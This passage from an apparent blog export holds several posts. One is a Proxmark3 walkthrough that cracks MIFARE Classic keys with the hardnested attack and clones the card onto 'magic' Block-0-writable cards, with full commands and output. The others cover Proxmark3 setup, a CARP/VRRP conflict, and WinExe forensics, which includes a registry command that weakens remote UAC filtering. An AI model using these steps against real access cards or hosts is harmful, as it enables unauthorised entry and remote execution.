\n|003|  ffffffffffff  |  ffffffffffff  |          \n|004|  ffffffffffff  |  ffffffffffff  |          \n|005|  ffffffffffff  |  ffffffffffff  |          \n|006|  ffffffffffff  |  ffffffffffff  |          \n|007|  ffffffffffff  |  ffffffffffff  |          \n|008|  ffffffffffff  |  ffffffffffff  |          \n|009|  ffffffffffff  |  ffffffffffff  |          \n|010|  ffffffffffff  |  ffffffffffff  |          \n|011|  ffffffffffff  |  ffffffffffff  |          \n|012|  ffffffffffff  |  ffffffffffff  |          \n|013|  ffffffffffff  |  ffffffffffff  |          \n|014|  ffffffffffff  |  ffffffffffff  |          \n|015|  ffffffffffff  |  ffffffffffff  |          \n|---|----------------|----------------|\n\nNotice that sector 001 above shows as 000000000000, which means that the key was\nnot discovered for that sector. Still, finding the key for 15/16 sectors is\npretty good!\n\nCracking the \"Secure\" Sectors\nNow that we have a valid key for the card, we are able to utilize the hf mf\nhardnested command to unlock sector 001. Before we do that, we need to make sure\nwe verify we can unlock a block using the key we've already discovered. Then we\nneed to get a block number that we are unable to currently access. Use the chart\nbelow as a reference:\n\nSector 000 - Block 0-3\nSector 001 - Block 4-7\nSector 002 - Block 8-11\nSector 003 - Block 12-15\nSector 004 - Block 16-19\nSector 005 - Block 20-23\nSector 006 - Block 24-27\nSector 007 - Block 28-31\nSector 008 - Block 32-35\nSector 009 - Block 36-39\nSector 010 - Block 40-43\nSector 011 - Block 44-47\nSector 012 - Block 48-51\nSector 013 - Block 52-55\nSector 014 - Block 56-59\nSector 015 - Block 60-63\n\nUsing the above conversion chart, we should be able to unlock block 0 with the\nkey FFFFFFFFFFFF and we should be unsuccessful unlocking block 4 using the same\nkey. Let's verify:\n\nproxmark3> hf mf chk 0 A FFFFFFFFFFFF\nchk key[ 0] ffffffffffff          \n\nFound valid key:[0:A]ffffffffffff          \n\nproxmark3> hf mf chk 4 A FFFFFFFFFFFF\nchk key[ 0] ffffffffffff          \n\n          \nNo valid keys found.\n\nPerfect! We have verified the key works successfully with block 0, but does not\nwork at all with block 4. Block 4 is part of sector 001, which we haven't\ncracked yet, so it all makes sense.\n\nNow let's use the hardnested attack to unlock sector 001:\n\nproxmark3> hf mf hardnested 0 A FFFFFFFFFFFF 4 A\n--target block no:  4, target key type:A, known target key: 0x000000000000 (not set), file action: none, Slow: No, Tests: 0\nUsing AVX2 SIMD core.\n\n\n\n time    | #nonces | Activity                                                | expected to brute force\n         |         |                                                         | #states         | time\n------------------------------------------------------------------------------------------------------\n       0 |       0 | Start using 4 threads and AVX2 SIMD core                |                 |\n       0 |       0 | Brute force benchmark: 900 million (2^29.7) keys/s      | 140737488355328 |    2d\n       1 |       0 | Using 235 precalculated bitflip state tables            | 140737488355328 |    2d\n       4 |     112 | Apply bit flip properties                               |    153070288896 |  3min\n       5 |     224 | Apply bit flip properties                               |     38262738944 |   43s\n       6 |     336 | Apply bit flip properties                               |     33238697984 |   37s\n       7 |     448 | Apply bit flip properties                               |     33104111616 |   37s\n       8 |     559 | Apply bit flip properties                               |     30823223296 |   34s\n       9 |     671 | Apply bit flip properties                               |     30728589312 |   34s\n       9 |     783 | Apply bit flip properties                               |     30728589312 |   34s\n      10 |     891 | Apply bit flip properties                               |     30728589312 |   34s\n      10 |    1002 | Apply bit flip properties                               |     30728589312 |   34s\n      11 |    1113 | Apply bit flip properties                               |     30728589312 |   34s\n      12 |    1223 | Apply bit flip properties                               |     30728589312 |   34s\n      13 |    1335 | Apply bit flip properties                               |     30728589312 |   34s\n      14 |    1443 | Apply bit flip properties                               |     30728589312 |   34s\n      15 |    1553 | Apply bit flip properties                               |     30728589312 |   34s\n      15 |    1660 | Apply bit flip properties                               |     30728589312 |   34s\n      17 |    1770 | Apply Sum property. Sum(a0) = 144                       |      1224898816 |    1s\n      18 |    1878 | Apply bit flip properties                               |      2006925312 |    2s\n      18 |    1986 | Apply bit flip properties                               |      1101943296 |    1s\n      19 |    2095 | Apply bit flip properties                               |      1406170624 |    2s\n      20 |    2095 | (1. guess: Sum(a8) = 0)                                 |      1406170624 |    2s\n      20 |    2095 | Apply Sum(a8) and all bytes bitflip properties          |      1331002112 |    1s\n      20 |    2095 | Brute force phase completed. Key found: 8a19d40cf2b5    |               0 |    0s\n\nNotice at the bottom it says Key found: 8a19d40cf2b5! Sweet!\n\nSo let's print the key table again using hf mf ekeyprn:\n\nproxmark3> hf mf ekeyprn\n|---|----------------|----------------|          \n|sec|key A           |key B           |          \n|---|----------------|----------------|          \n|000|  ffffffffffff  |  ffffffffffff  |          \n|001|  000000000000  |  000000000000  |          \n|002|  ffffffffffff  |  ffffffffffff  |          \n|003|  ffffffffffff  |  ffffffffffff  |          \n|004|  ffffffffffff  |  ffffffffffff  |          \n|005|  ffffffffffff  |  ffffffffffff  |          \n|006|  ffffffffffff  |  ffffffffffff  |          \n|007|  ffffffffffff  |  ffffffffffff  |          \n|008|  ffffffffffff  |  ffffffffffff  |          \n|009|  ffffffffffff  |  ffffffffffff  |          \n|010|  ffffffffffff  |  ffffffffffff  |          \n|011|  ffffffffffff  |  ffffffffffff  |          \n|012|  ffffffffffff  |  ffffffffffff  |          \n|013|  ffffffffffff  |  ffffffffffff  |          \n|014|  ffffffffffff  |  ffffffffffff  |          \n|015|  ffffffffffff  |  ffffffffffff  |          \n|---|----------------|----------------|\n\nWhat gives? Why is our new key not in the table? We need to run the hf mf chk \ncommand again to verify this new key and add it to the internal key buffer\ntable:\n\nproxmark3> hf mf chk *1 ? t 8a19d40cf2b5\nchk key[ 0] 8a19d40cf2b5          \n\nTo cancel this operation press the button on the proxmark...          \n--o          \n|---|----------------|---|----------------|---|          \n|sec|key A           |res|key B           |res|          \n|---|----------------|---|----------------|---|          \n|000|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|001|  8a19d40cf2b5  | 1 |  8a19d40cf2b5  | 1 |          \n|002|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|003|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|004|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|005|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|006|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|007|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|008|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|009|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|010|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|011|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|012|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|013|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|014|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|015|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|---|----------------|---|----------------|---|          \nFound keys have been transferred to the emulator memory\n\nCool! It shows as valid for sector 001. However, the res column for every other\nsector is now 0. Don't worry about that because our key table is still accurate:\n\nproxmark3> hf mf ekeyprn\n|---|----------------|----------------|          \n|sec|key A           |key B           |          \n|---|----------------|----------------|          \n|000|  ffffffffffff  |  ffffffffffff  |          \n|001|  8a19d40cf2b5  |  8a19d40cf2b5  |          \n|002|  ffffffffffff  |  ffffffffffff  |          \n|003|  ffffffffffff  |  ffffffffffff  |          \n|004|  ffffffffffff  |  ffffffffffff  |          \n|005|  ffffffffffff  |  ffffffffffff  |          \n|006|  ffffffffffff  |  ffffffffffff  |          \n|007|  ffffffffffff  |  ffffffffffff  |          \n|008|  ffffffffffff  |  ffffffffffff  |          \n|009|  ffffffffffff  |  ffffffffffff  |          \n|010|  ffffffffffff  |  ffffffffffff  |          \n|011|  ffffffffffff  |  ffffffffffff  |          \n|012|  ffffffffffff  |  ffffffffffff  |          \n|013|  ffffffffffff  |  ffffffffffff  |          \n|014|  ffffffffffff  |  ffffffffffff  |          \n|015|  ffffffffffff  |  ffffffffffff  |          \n|---|----------------|----------------|\n\nNice! We've broken all sectors and we can now dump / restore the card!\n\nDumping and Restoring the MIFARE Card\nThis part is simple. You just need to run hf mf dump to dump the contents of the\nMIFARE card to a file on your disk. After that, you need to run hf mf restore \nusing a compatible blank card.\n\nWhy doesn't the card work?\nIf the card works for you after the above, great! If not, you may be left\nwondering where you went wrong. The MIFARE card standard says that Block 0 \nshould be read-only. This effectively means that the card cannot be identically\nduplicated for security reasons. A lot of RFID systems verify that the UID on\nthe card is correct and your duplicate will be detected. So what can you do?\n\nEnter the Chinese Magic Backdoor cards! These special MIFARE cards utilize a\nwritable Block 0 that allow you to completely clone a card and it will be\nvirtually undetectable! There are a few types you should be aware of:\n\nUID - The original Chinese Magic Backdoor card. These cards respond to the\nbackdoor commands and will show Chinese magic backdoor commands (GEN 1a)\ndetected when you do an hf search. These cards can be detected by probing the\ncard to see if it responds to the backdoor commands. Some RFID systems may try\nto detect these cards.\n\nCUID - The 2nd generation Chinese Magic Backdoor card. These cards do not use\nthe backdoor commands, but instead allow Block 0 to be written to like any other\nblock on the card. This gives the card better compatibility to be written to\nfrom an Android phone. However, some RFID systems can detect this type of card\nby sending a write command to Block 0, making the card invalid after the first\nuse is attempted.\n\nFUID - This type of card is not as common, but allows Block 0 to be written to\njust once. This allows you to create a clone of a card and any checks done by\nthe RFID system will pass because Block 0 is no longer writable.\n\nUFUID - This type of card is apparently a \"better\" version of the FUID card.\nInstead of only allowing Block 0 to be written once, you can write to it many\ntimes and then lock the block later when you're happy with the result. After\nlocking Block 0, it cannot be unlocked to my knowledge. I do not think there is\ncurrently a way to lock these cards using the Proxmark3.\n\nBoth a UID and CUID card are included with the Proxmark3 Easy (or at least the\none I bought on Ebay...). To write Block 0, I used the hf mf csetuid command.\nThis card then worked perfectly. Hooray!","feature_image":"https://images.unsplash.com/photo-1509718443690-d8e2fb3474b7?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ","featured":1,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-08-08T00:19:24.000Z","updated_at":"2019-09-04T13:06:47.000Z","published_at":"2018-08-08T20:19:09.000Z","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d6eb8f7992f0652efb50f88","uuid":"a4899651-25cf-4190-9fae-042f4a5adecb","title":"Getting Started with the Proxmark3 Easy","slug":"getting-started-with-the-proxmark3-easy","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"/content/images/2019/09/Proxmark3_Easy.jpg\"}],[\"code\",{\"code\":\"proxmark3> hw tune\\n\\nMeasuring antenna characteristics, please wait.........\\n# LF antenna: 21.04 V @   125.00 kHz\\n# LF antenna: 18.29 V @   134.00 kHz\\n# LF optimal: 21.04 V @   125.00 kHz\\n# HF antenna: 22.51 V @    13.56 MHz\\nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.\"}]],\"markups\":[[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Windows\"]],[\"a\"],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Kali-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/MacOS\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Gentoo-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/android\"]],[\"code\"]],\"sections\":[[1,\"p\",[[0,[],0,\"It took me several hours to get the Proxmark3 Easy up and running the first time. I had no idea what I was doing and couldn't find much information specific to the Proxmark3 Easy.\"]]],[1,\"p\",[[0,[],0,\"The one significant difference of the Proxmark3 Easy compared to the previous generations is that the Easy only has half the amount of storage in the microcontroller (256kb instead of 512kb). However, this will not matter if you are using the official Proxmark3 firmware.\"]]],[10,0],[1,\"p\",[[0,[],0,\"The first thing you want to do when you get your new Proxmark3 Easy is to download the latest official Proxmark3 client and firmware. Here are some tutorials for common operating systems: \"],[0,[0],1,\"Windows\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[2],1,\"Ubuntu\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[3],1,\"Kali\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[4],1,\"Mac OS\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[5],1,\"Gentoo\"],[0,[1],1,\",\"],[0,[],0,\" and \"],[0,[6],1,\"Android\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"When you are flashing your Proxmark3 Easy, make sure you flash both the bootloader and the main firmware. I tried flashing just the main firmware since I already had the newer CDC bootloader, but it caused the Proxmark3 to bootloop.\"]]],[1,\"p\",[[0,[],0,\"To flash the bootloader and firmware, you want to hold down the button on the side of the Proxmark3 when you plug it in. This will put the Proxmark3 into a flashable state. It should be obvious that it's in a different mode by the flashing of the LEDs on the Proxmark3 board.\"]]],[1,\"p\",[[0,[],0,\"You should always use the latest firmware and client, where possible. At the very least, you should always ensure that the client and the firmware running on the Proxmark3 are the same version.\"]]],[1,\"p\",[[0,[],0,\"Once you get it flashed, you can run the client using \"],[0,[7],1,\"client/proxmark3 /dev/ttyACM0\"],[0,[],0,\" from the proxmark3 folder. You may need to substitute /dev/ttyACM0 with the appropriate TTY device.\"]]],[1,\"p\",[[0,[],0,\"To make sure everything works as expected, try \"],[0,[7],1,\"hw tune\"],[0,[],0,\" to ensure both antennas are working and responding correctly:\"]]],[10,1],[1,\"p\",[[0,[],0,\"Now try reading an RFID key using \"],[0,[7],1,\"hf search\"],[0,[],0,\" if it is 13.56 MHz or \"],[0,[7],1,\"lf search\"],[0,[],0,\" if it is 125kHz.\"]]]]}","html":"<p>It took me several hours to get the Proxmark3 Easy up and running the first time. I had no idea what I was doing and couldn't find much information specific to the Proxmark3 Easy.</p><p>The one significant difference of the Proxmark3 Easy compared to the previous generations is that the Easy only has half the amount of storage in the microcontroller (256kb instead of 512kb). However, this will not matter if you are using the official Proxmark3 firmware.</p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/09/Proxmark3_Easy.jpg\" class=\"kg-image\"></figure><!--kg-card-end: image--><p>The first thing you want to do when you get your new Proxmark3 Easy is to download the latest official Proxmark3 client and firmware. Here are some tutorials for common operating systems: <a href=\"https://github.com/Proxmark/proxmark3/wiki/Windows\">Windows</a><a>,</a> <a href=\"https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux\">Ubuntu</a><a>,</a> <a href=\"https://github.com/Proxmark/proxmark3/wiki/Kali-Linux\">Kali</a><a>,</a> <a href=\"https://github.com/Proxmark/proxmark3/wiki/MacOS\">Mac OS</a><a>,</a> <a href=\"https://github.com/Proxmark/proxmark3/wiki/Gentoo-Linux\">Gentoo</a><a>,</a> and <a href=\"https://github.com/Proxmark/proxmark3/wiki/android\">Android</a>.</p><p>When you are flashing your Proxmark3 Easy, make sure you flash both the bootloader and the main firmware. I tried flashing just the main firmware since I already had the newer CDC bootloader, but it caused the Proxmark3 to bootloop.</p><p>To flash the bootloader and firmware, you want to hold down the button on the side of the Proxmark3 when you plug it in. This will put the Proxmark3 into a flashable state. It should be obvious that it's in a different mode by the flashing of the LEDs on the Proxmark3 board.</p><p>You should always use the latest firmware and client, where possible. At the very least, you should always ensure that the client and the firmware running on the Proxmark3 are the same version.</p><p>Once you get it flashed, you can run the client using <code>client/proxmark3 /dev/ttyACM0</code> from the proxmark3 folder. You may need to substitute /dev/ttyACM0 with the appropriate TTY device.</p><p>To make sure everything works as expected, try <code>hw tune</code> to ensure both antennas are working and responding correctly:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hw tune\n\nMeasuring antenna characteristics, please wait.........\n# LF antenna: 21.04 V @   125.00 kHz\n# LF antenna: 18.29 V @   134.00 kHz\n# LF optimal: 21.04 V @   125.00 kHz\n# HF antenna: 22.51 V @    13.56 MHz\nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</code></pre><!--kg-card-end: code--><p>Now try reading an RFID key using <code>hf search</code> if it is 13.56 MHz or <code>lf search</code> if it is 125kHz.</p>","comment_id":"5b6a526475c22775c973640f","plaintext":"It took me several hours to get the Proxmark3 Easy up and running the first\ntime. I had no idea what I was doing and couldn't find much information specific\nto the Proxmark3 Easy.\n\nThe one significant difference of the Proxmark3 Easy compared to the previous\ngenerations is that the Easy only has half the amount of storage in the\nmicrocontroller (256kb instead of 512kb). However, this will not matter if you\nare using the official Proxmark3 firmware.\n\nThe first thing you want to do when you get your new Proxmark3 Easy is to\ndownload the latest official Proxmark3 client and firmware. Here are some\ntutorials for common operating systems: Windows\n[https://github.com/Proxmark/proxmark3/wiki/Windows], Ubuntu\n[https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux], Kali\n[https://github.com/Proxmark/proxmark3/wiki/Kali-Linux], Mac OS\n[https://github.com/Proxmark/proxmark3/wiki/MacOS], Gentoo\n[https://github.com/Proxmark/proxmark3/wiki/Gentoo-Linux], and Android\n[https://github.com/Proxmark/proxmark3/wiki/android].\n\nWhen you are flashing your Proxmark3 Easy, make sure you flash both the\nbootloader and the main firmware. I tried flashing just the main firmware since\nI already had the newer CDC bootloader, but it caused the Proxmark3 to bootloop.\n\nTo flash the bootloader and firmware, you want to hold down the button on the\nside of the Proxmark3 when you plug it in. This will put the Proxmark3 into a\nflashable state. It should be obvious that it's in a different mode by the\nflashing of the LEDs on the Proxmark3 board.\n\nYou should always use the latest firmware and client, where possible. At the\nvery least, you should always ensure that the client and the firmware running on\nthe Proxmark3 are the same version.\n\nOnce you get it flashed, you can run the client using client/proxmark3\n/dev/ttyACM0 from the proxmark3 folder. You may need to substitute /dev/ttyACM0\nwith the appropriate TTY device.\n\nTo make sure everything works as expected, try hw tune to ensure both antennas\nare working and responding correctly:\n\nproxmark3> hw tune\n\nMeasuring antenna characteristics, please wait.........\n# LF antenna: 21.04 V @   125.00 kHz\n# LF antenna: 18.29 V @   134.00 kHz\n# LF optimal: 21.04 V @   125.00 kHz\n# HF antenna: 22.51 V @    13.56 MHz\nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.\n\nNow try reading an RFID key using hf search if it is 13.56 MHz or lf search if\nit is 125kHz.","feature_image":"https://images.unsplash.com/photo-1529465230221-a0d10e46fcbb?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-08-08T02:16:04.000Z","updated_at":"2019-09-04T13:09:39.000Z","published_at":"2018-08-09T17:44:06.000Z","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d6eb8f7992f0652efb50f89","uuid":"264d32c3-22a1-4b00-9554-9c82e9644136","title":"CARP Conflict with VRRP","slug":"carp-conflict-with-vrrp","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[[\"a\",[\"href\",\"https://www.netgate.com/docs/pfsense/highavailability/troubleshooting-high-availability-clusters.html\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"We utilize two pfSenses in CARP-failover mode as the firewalls protecting a Hyper-V cluster. This past weekend at 3am, the firewalls started experiencing high packet loss to the upstream gateway.\"]]],[1,\"p\",[[0,[],0,\"The problem, as it turns out, was that the upstream provider migrated us to new switching infrastructure that utilized VRRP instead of HSRP for their failover. VRRP and CARP happen to both share the same MAC address scheme for their shared virtual IPs. These MAC addresses can be changed, and the conflict resolved, by setting the VRID (for VRRP) or the VHID (for CARP) to a unique number. The VRID and VHID setting determines the last octet of the MAC address (e.g. 00:00:5E:00:01:XX).\"]]],[1,\"p\",[[0,[],0,\"If you happen to be experiencing this problem on pfSense, you can read more about troubleshooting it \"],[0,[0],1,\"here\"],[0,[],0,\".\"]]]]}","html":"<p>We utilize two pfSenses in CARP-failover mode as the firewalls protecting a Hyper-V cluster. This past weekend at 3am, the firewalls started experiencing high packet loss to the upstream gateway.</p><p>The problem, as it turns out, was that the upstream provider migrated us to new switching infrastructure that utilized VRRP instead of HSRP for their failover. VRRP and CARP happen to both share the same MAC address scheme for their shared virtual IPs. These MAC addresses can be changed, and the conflict resolved, by setting the VRID (for VRRP) or the VHID (for CARP) to a unique number. The VRID and VHID setting determines the last octet of the MAC address (e.g. 00:00:5E:00:01:XX).</p><p>If you happen to be experiencing this problem on pfSense, you can read more about troubleshooting it <a href=\"https://www.netgate.com/docs/pfsense/highavailability/troubleshooting-high-availability-clusters.html\">here</a>.</p>","comment_id":"5b9fb88597745d489795e9cc","plaintext":"We utilize two pfSenses in CARP-failover mode as the firewalls protecting a\nHyper-V cluster. This past weekend at 3am, the firewalls started experiencing\nhigh packet loss to the upstream gateway.\n\nThe problem, as it turns out, was that the upstream provider migrated us to new\nswitching infrastructure that utilized VRRP instead of HSRP for their failover.\nVRRP and CARP happen to both share the same MAC address scheme for their shared\nvirtual IPs. These MAC addresses can be changed, and the conflict resolved, by\nsetting the VRID (for VRRP) or the VHID (for CARP) to a unique number. The VRID\nand VHID setting determines the last octet of the MAC address (e.g.\n00:00:5E:00:01:XX).\n\nIf you happen to be experiencing this problem on pfSense, you can read more\nabout troubleshooting it here\n[https://www.netgate.com/docs/pfsense/highavailability/troubleshooting-high-availability-clusters.html]\n.","feature_image":"https://images.unsplash.com/photo-1544197150-b99a580bb7a8?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-09-17T14:21:57.000Z","updated_at":"2019-09-04T13:17:14.000Z","published_at":"2018-09-17T14:41:37.000Z","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d711606992f0652efb50fa3","uuid":"e9b76d71-6881-47fc-843d-f1cf42dd1e2f","title":"WinExe Forensics","slug":"winexe-forensics","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"code\",{\"code\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\",\"caption\":\"Run this inside of an Administrator command prompt.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the winexesvc service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can create a timeline and find relevant information.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that registry fix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is retained. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[1,\"p\",[]],[10,4],[1,\"p\",[]],[10,5],[1,\"p\",[]]]}","html":"<p>WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.</p><p>Recently, an antivirus alert fired for the C:\\Windows\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can create a timeline and find relevant information.</p><p>To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.</p><p>The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:</p><!--kg-card-begin: code--><pre><code>ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED</code></pre><!--kg-card-end: code--><p>To fix this issue, I had to run a registry fix on the Windows 7 host:</p><!--kg-card-begin: code--><figure class=\"kg-card kg-code-card\"><pre><code>reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></pre><figcaption>Run this inside of an Administrator command prompt.</figcaption></figure><!--kg-card-end: code--><p>After running that registry fix, WinExe now functions normally:</p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><p>The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is retained. For example, there are no events created for commands run through WinExe.</p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card kg-width-wide kg-card-hascaption\"><img src=\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\" class=\"kg-image\"><figcaption>System Event ID 7045 fired during the winexesvc service creation.</figcaption></figure><!--kg-card-end: image--><p></p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card kg-width-wide kg-card-hascaption\"><img src=\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\" class=\"kg-image\"><figcaption>Security Event ID 4624 fired for the WinExe authentication event.</figcaption></figure><!--kg-card-end: image--><p></p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card kg-width-wide kg-card-hascaption\"><img src=\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\" class=\"kg-image\"><figcaption>System Event ID 7036 fires for the winexesvc service stopping and starting.</figcaption></figure><!--kg-card-end: image-->","comment_id":"5d711606992f0652efb50fa3","plaintext":"WinExe is a utility that allows linux hosts to remotely execute commands on a\nWindows machine. The functionality is very similar to PsExec.\n\nRecently, an antivirus alert fired for the C:\\Windows\\winexesvc.exe executable.\nIt is classified as Riskware or as a Hacktool when searching the hash on\nVirusTotal. Googling around, it appears that WinExe was being used by APT28\n(Fancy Bear) as a lateral movement tool. However, since it can be used for\nlegitimate management purposes, it is unwise to jump to conclusions before\ngetting more context. This post outlines the artifacts left on the system after\nit has been used, specifically in Windows Event Viewer so that others facing\nthis alert can create a timeline and find relevant information.\n\nTo investigate WinExe, I spun up a lab environment in Virtualbox consisting of\nParrot OS and Windows 7.\n\nThe first hurdle I encountered was hitting the following error when trying to\nrun WinExe on Parrot against the Windows 7 machine:\n\nERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\n\nTo fix this issue, I had to run a registry fix on the Windows 7 host:\n\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\nRun this inside of an Administrator command prompt.After running that registry\nfix, WinExe now functions normally:\n\nThe three screenshots below outline the forensic artifacts left behind in\nWindows Event Viewer. As you can see, not a whole lot of useful information is\nretained. For example, there are no events created for commands run through\nWinExe.\n\nSystem Event ID 7045 fired during the winexesvc service creation.\n\nSecurity Event ID 4624 fired for the WinExe authentication event.\n\nSystem Event ID 7036 fires for the winexesvc service stopping and 